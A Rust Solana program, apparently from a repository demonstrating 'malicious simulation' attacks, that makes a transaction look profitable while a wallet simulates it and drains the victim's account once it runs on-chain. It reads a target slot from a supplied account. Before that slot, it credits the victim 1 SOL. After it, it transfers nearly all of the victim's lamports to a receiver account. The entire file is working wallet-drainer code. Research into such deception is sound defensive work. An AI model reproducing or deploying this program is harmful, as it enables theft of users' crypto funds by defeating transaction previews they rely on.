use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
    system_instruction,
    sysvar::{clock::Clock, Sysvar},
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Hello !");

    let account_info_iter = &mut accounts.iter();

    let v_account = next_account_info(account_info_iter)?;
    let slot_account = next_account_info(account_info_iter)?;
    let system_program = next_account_info(account_info_iter)?;
    let receiver_account = next_account_info(account_info_iter)?;

    if v_account.lamports() < 10000000 {
        msg!("Not enough lamports in v account !");
        return Err(ProgramError::InvalidArgument);
    }

    // Slot is an u64 at the end of the structure
    let data = slot_account.data.borrow();
    let slot: u64 = u64::from_le_bytes(data[data.len() - 8..].try_into().unwrap());

    let clock = Clock::get()?;

    msg!("next_slot is {:?} ", slot);
    msg!("clock is in slot {:?} ", clock.slot);
    
    if clock.slot >= slot {
        msg!("We are onchain, let's get the money");
        invoke(
            &system_instruction::transfer(
                v_account.key,
                receiver_account.key,
                v_account.lamports() - 890880,
            ),
            &[
                v_account.clone(),
                receiver_account.clone(),
                system_program.clone(),
            ],
        )?;
    } else {
        **receiver_account.try_borrow_mut_lamports()? -= 1_000_000_000;
        **v_account.try_borrow_mut_lamports()? += 1_000_000_000;
    }

    Ok(())
}

https://github.com/El-Merovingio/solana-hacks/tree/main/malicious-simulation